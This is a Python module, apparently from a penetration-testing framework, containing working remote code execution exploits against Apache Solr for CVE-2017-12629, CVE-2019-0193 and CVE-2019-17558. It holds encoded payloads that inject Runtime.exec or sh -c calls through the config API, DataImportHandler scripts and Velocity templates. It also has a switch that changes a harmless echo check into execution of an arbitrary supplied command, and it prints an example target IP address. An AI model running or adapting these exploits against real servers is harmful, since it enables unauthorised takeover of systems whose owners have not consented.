import random,string,requests,json,re
from requests_toolbelt.utils import dump
from ClassCongregation import _urlparse
from urllib.parse import urlparse, quote
import CodeTest
################
##--ApacheSolr--##
#cve_2017_12629 无回显的命令执行, 默认VULN = None, 7.1.0以上(包含)版本已删除RunExecutableListener
#cve_2019_0193  无回显的命令执行，默认VULN = None
#cve_2019_17558 有回显的命令执行, 设置VULN = True
################
#echo VuLnEcHoPoCSuCCeSS
#VULN = None => 漏洞测试
#VULN = True => 命令执行
CodeTest.VULN = None
TIMEOUT = 10
class ApacheSolr():
    def __init__(self, url, CMD):
        self.url = url
        # Change the url format to conform to the program
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if self.port == None and r"https://" in self.url:
            self.port = 443
        elif self.port == None and r"http://" in self.url:
            self.port = 80
        
        if r"https://" in self.url:
            self.url = "https://"+self.hostname+":"+str(self.port)
        if r"http://" in self.url:
            self.url = "http://"+self.hostname+":"+str(self.port)
        self.CMD = CMD
        self.payload_cve_2017_12629 = '{"add-listener":{"event":"postCommit","name":"newcore","class":"solr.RunExecu' \
            'tableListener","exe":"sh","dir":"/bin/","args":["-c", "RECOMMAND"]}}'
        self.payload_cve_2019_0193 = "command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test" \
            "&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5B" \
            "CDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22RECOMMAND%22)%3B%0A++++++" \
            "++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++" \
            "++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%2" \
            "2XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3A" \
            "poc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport"
        self.payload_cve_2019_17558="/select?q=1&&wt=velocity&v.template=cus" \
            "tom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.for" \
            "Name(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27" \
            "java.lang.Character%27))+%23set($str=$x.class.forName(%27java.l" \
            "ang.String%27))+%23set($ex=$rt.getRuntime().exec(%27RECOMMAND%2" \
            "7))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach(" \
            "$i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read" \
            "()))%23end"

    def cve_2017_12629(self):
        self.pocname = "Apache Solr: CVE-2017-12629"
        self.corename = "null"
        self.newcore = ''.join(random.choices(string.ascii_letters+string.digits, k=6))
        self.payload1 = self.payload_cve_2017_12629.replace("RECOMMAND", self.CMD).replace("newcore", self.newcore)
        self.payload2 = '[{"id": "test"}]'
        self.rawdata = None
        self.info = None
        self.r = "PoCWating"
        self.urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
        self.headers_solr1 = {
            'Host': "localhost",
            'Accept': "*/*",
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            'Connection': "close"
        }
        self.headers_solr2 = {
            'Host': "localhost",
            'ccept-Language': "en",
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            'Connection': "close",
            'Content-Type': "application/json"
        }
        self.method = "post"
        self.r = "PoCWating"
        try:
            self.request = requests.get(url=self.url+"/solr/", headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
            if self.request.status_code == 200:
                self.get_ver = re.findall(r'img/favicon\.ico\?_=(.*)"', self.request.text)[0]
                self.ver = self.get_ver.replace(".", "")
            self.request = requests.get(url=self.urlcore, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
            try:
                self.corename = list(json.loads(self.request.text)["status"])[0]
            except:
                pass
            self.request = requests.post(self.url+"/solr/"+str(self.corename)+"/config", data=self.payload1, headers=self.headers_solr1, timeout=TIMEOUT, verify=False)
            if self.request.status_code == 200 and self.corename != "null" and int(self.ver) < 710:
                self.r = "PoCSuCCeSS"
            self.request = requests.post(self.url+"/solr/"+str(self.corename)+"/update", data=self.payload2, headers=self.headers_solr2, timeout=TIMEOUT, verify=False)
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            self.info = CodeTest.Colored_.rce()+" [activemq version: " + self.get_ver + "]"+" [newcore:"+self.newcore+"] "
            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2019_0193(self):
        self.pocname = "Apache Solr: CVE-2019-0193"
        self.corename = "null"
        self.info = None
        self.method = "get"
        self.r = "PoCWating"
        self.payload = self.payload_cve_2019_0193.replace("RECOMMAND", quote(self.CMD,'utf-8'))
        self.solrhost = self.hostname + ":" + str(self.port)
        self.headers = {
            'Host': ""+self.solrhost,
            'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            'Accept': "application/json, text/plain, */*",
            'Accept-Language': "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            'Accept-Encoding': "zip, deflate",
            'Referer': self.url+"/solr/",
            'Content-type': "application/x-www-form-urlencoded",
            'X-Requested-With': "XMLHttpRequest",
            'Connection': "close"
        }
        self.urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
        self.rawdata = "null"
        try:
            self.request = requests.get(url=self.urlcore, headers=self.headers, timeout=TIMEOUT, verify=False)
            try:
                self.corename = list(json.loads(self.request.text)["status"])[0]
            except:
                pass
            self.urlconfig = self.url+"/solr/"+str(self.corename)+"/admin/mbeans?cat=QUERY&wt=json"
            # check solr mode: "solr.handler.dataimport.DataImportHandler"
            self.request = requests.get(url=self.urlconfig, headers=self.headers, timeout=TIMEOUT, verify=False)
            self.urlcmd = self.url+"/solr/"+str(self.corename)+"/dataimport"
            self.request = requests.post(self.urlcmd, data=self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
            if self.request.status_code==200 and self.corename!="null":
                self.r = "PoCSuCCeSS"
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            self.info = CodeTest.Colored_.rce()+" [corename:"+str(self.corename)+"]"
            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2019_17558(self):
        self.pocname = "Apache Solr: CVE-2019-17558"
        self.corename = None
        self.payload_1 = self.payload_cve_2019_17558.replace("RECOMMAND","id")
        self.payload_2 = self.payload_cve_2019_17558.replace("RECOMMAND",self.CMD)
        self.method = "get"
        self.urlcore = self.url+"/solr/admin/cores?indexInfo=false&wt=json"
        self.rawdata = None
        self.r = "PoCWating"
        try:
            self.request = requests.get(url=self.urlcore, timeout=TIMEOUT, verify=False)
            try:
                self.corename = list(json.loads(self.request.text)["status"])[0]
            except:
                pass
            self.info = CodeTest.Colored_.rce()+" [corename:"+str(self.corename)+"]"
            self.urlapi = self.url+"/solr/"+str(self.corename)+"/config"
            self.headers_json = {'Content-Type': 'application/json'}
            self.set_api_data = """
            {
              "update-queryresponsewriter": {
                "startup": "lazy",
                "name": "velocity",
                "class": "solr.VelocityResponseWriter",
                "template.base.dir": "",
                "solr.resource.loader.enabled": "true",
                "params.resource.loader.enabled": "true"
              }
            }
            """
            if CodeTest.VULN == None:
                self.request = requests.post(self.urlapi, data=self.set_api_data, headers=self.headers_json, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                if self.request.status_code == 200 and self.corename != None:
                    self.r = "PoCSuCCeSS"
                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
                else:
                    CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.post(self.urlapi, data=self.set_api_data, headers=self.headers_json, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                self.request = requests.get(self.url+"/solr/"+str(self.corename)+self.payload_2, timeout=TIMEOUT, verify=False)
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

print("""eg: http://106.53.249.95:8983
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Apache Solr       | cve_2017_12629   |  Y  |  Y  | < 7.1.0, runexecutablelistener rce & xxe, only rce is here  |
| Apache Solr       | cve_2019_0193    |  Y  |  N  | < 8.2.0, dataimporthandler module remote code execution     |
| Apache Solr       | cve_2019_17558   |  Y  |  Y  | 5.0.0 - 8.3.1, velocity response writer rce                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    #print(kwargs['pocname'])
    if CodeTest.VULN == None:
        ExpApacheSolr = ApacheSolr(_urlparse(kwargs['url']),"echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpApacheSolr = ApacheSolr(_urlparse(kwargs['url']),kwargs['cmd'])

    if kwargs['pocname'] == "cve_2017_12629":
        ExpApacheSolr.cve_2017_12629()
    elif kwargs['pocname'] == "cve_2019_0193":
        ExpApacheSolr.cve_2019_0193()
    elif kwargs['pocname'] == "cve_2019_17558":
        ExpApacheSolr.cve_2019_17558()
    else:
        ExpApacheSolr.cve_2017_12629()
        ExpApacheSolr.cve_2019_0193()
        ExpApacheSolr.cve_2019_17558()




